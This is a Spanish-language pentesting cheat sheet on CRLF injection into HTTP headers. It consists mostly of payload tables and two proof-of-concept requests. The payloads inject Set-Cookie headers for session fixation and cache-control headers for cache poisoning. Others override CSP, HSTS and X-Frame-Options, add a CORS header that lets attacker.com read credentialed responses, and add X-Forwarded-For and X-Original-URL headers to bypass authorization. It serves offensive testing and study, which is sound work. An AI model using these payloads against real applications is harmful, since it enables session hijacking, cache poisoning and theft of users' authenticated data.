---
aliases:
  - Set-Cookie Injection
  - Cache Poisoning Header
  - CSP Bypass via Header
tags:
  - type/technique
  - vuln/crlf-injection
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[CRLF Injection]]'
---
# CRLF Injection - HTTP Header Injection

***

## Set-Cookie Injection

| **Payload (param URL)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?url=ok%0d%0aSet-Cookie:%20PHPSESSID=ATTACKER` | Set-Cookie con session controlada → session fixation post-login | App refleja `url` en `Location`. |
| `?url=ok%0d%0aSet-Cookie:%20csrf=ATTACKER_KNOWN` | CSRF token predecible | Token reflejado a víctima permite CSRF post-victim. |
| `?url=ok%0d%0aSet-Cookie:%20track=1;%20Domain=.target.com;%20Max-Age=31536000` | Cookie persistente cross-subdomain | Tracking/scope-abuse de subdominios. |
| `?url=ok%0d%0aSet-Cookie:%20admin=1;%20Path=/admin` | Cookie path-scoped a `/admin` | App lee `admin=1` como flag de privilegio. |
| `?url=ok%0d%0aSet-Cookie:%20a=1%0d%0aSet-Cookie:%20b=2` | Múltiples cookies en una request | Bulk inject para flag abuse. |
| `?url=ok%0d%0aSet-Cookie:%20session=X;%20SameSite=None;%20Secure` | Cookie sin HttpOnly + `SameSite=None` | Habilita robo via XSS + CSRF cross-site. |
^crlfi-header-cookie

### PoC Set-Cookie injection

```bash
PAYLOAD='ok%0d%0aSet-Cookie:%20PHPSESSID=ATTACKER_SESSION_ID'
curl -sI "https://target.com/redirect?url=$PAYLOAD"

# Respuesta:
# HTTP/1.1 302 Found
# Location: ok
# Set-Cookie: PHPSESSID=ATTACKER_SESSION_ID   ← inyectada
#
# Víctima recibe Set-Cookie del atacante → loguea → atacante reusa cookie
```

___

## Cache Poisoning via Header

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?url=ok%0d%0aCache-Control:%20public,%20max-age=31536000` | Fuerza al cache a guardar la respuesta 1 año | CDN/proxy con cache-control respetado. |
| `?url=ok%0d%0aExpires:%20Mon,%2031%20Dec%202099%2023:59:59%20GMT` | TTL extendido a 2099 | Edge cache con `Expires` legacy. |
| `?url=ok%0d%0aVary:%20User-Agent` | Cache key se vuelve por-UA → atacante puede targeting | Manipulación de cache key. |
| `?url=ok%0d%0aSurrogate-Control:%20max-age=999999` | TTL en Varnish/Fastly (header de surrogate) | Edge cache Fastly/Akamai. |
| `?url=ok%0d%0aCDN-Cache-Control:%20max-age=31536000` | TTL en CDN moderno (Cloudflare-style) | Cloudflare/CloudFront cache. |
| `?url=ok%0d%0aETag:%20"static"%0d%0aLast-Modified:%20Mon,%2001%20Jan%202024` | Cache validation con ETag fijo → 304 forever | Forzar `If-None-Match` hits. |
^crlfi-header-cache

___

## CSP Bypass via Injected Header

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?url=ok%0d%0aContent-Security-Policy:%20default-src%20*%20'unsafe-inline'%20'unsafe-eval'` | CSP override permisiva | App envía CSP estricta, atacante la sobrescribe. |
| `?url=ok%0d%0aContent-Security-Policy-Report-Only:%20default-src%20*` | CSP en report-only → no bloquea | Detection bypass. |
| `?url=ok%0d%0aStrict-Transport-Security:%20max-age=0` | Desactiva HSTS → habilita downgrade HTTP | Combo con MITM/SSL-strip. |
| `?url=ok%0d%0aX-Frame-Options:%20ALLOWALL` | Desactiva XFO → habilita clickjacking | Combo con clickjacking PoC. |
| `?url=ok%0d%0aCross-Origin-Resource-Policy:%20cross-origin` | CORP permisiva → recurso embebible cross-site | Combo SSRF/iframe abuse. |
| `?url=ok%0d%0aAccess-Control-Allow-Origin:%20https://attacker.com%0d%0aAccess-Control-Allow-Credentials:%20true` | CORS con credentials hacia atacante | Robo de respuestas autenticadas. |
^crlfi-header-csp

___

## Custom Header Injection (X-*)

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?url=ok%0d%0aX-Forwarded-For:%20127.0.0.1` | Backend confía en XFF → atacante "es" localhost | App con allow-list por IP. |
| `?url=ok%0d%0aX-Forwarded-Host:%20attacker.com` | App genera URLs absolutas con host atacante | Combo con password reset / OAuth. |
| `?url=ok%0d%0aX-Original-URL:%20/admin` | IIS / ASP.NET reescribe path → bypass de autz | Backend IIS, módulo URL rewrite. |
| `?url=ok%0d%0aX-Rewrite-URL:%20/admin` | Misma idea que `X-Original-URL` | Apache/nginx rewrite. |
| `?url=ok%0d%0aX-User:%20admin` | Backend trustea header de auth (proxy auth) | App con SSO mal config. |
| `?url=ok%0d%0aX-Forwarded-Proto:%20https` | Engaña SSL detection → bypass HTTPS-only | App con scheme-detection ingenua. |
| `?url=ok%0d%0aAuthorization:%20Bearer%20EYJ...` | Inyecta auth header en backend chain | Backend con trust transitivo. |
^crlfi-header-custom

### PoC custom header chain

```
GET /redirect?url=ok%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aX-Original-URL:%20/admin HTTP/1.1
Host: target.com

Respuesta del server (reflejada):
HTTP/1.1 302 Found
Location: ok
X-Forwarded-For: 127.0.0.1     ← inyectado
X-Original-URL: /admin          ← inyectado

Backend con middleware que lee X-Forwarded-For para allow-list
o X-Original-URL para path override → atacante bypasea autorización.
```

***
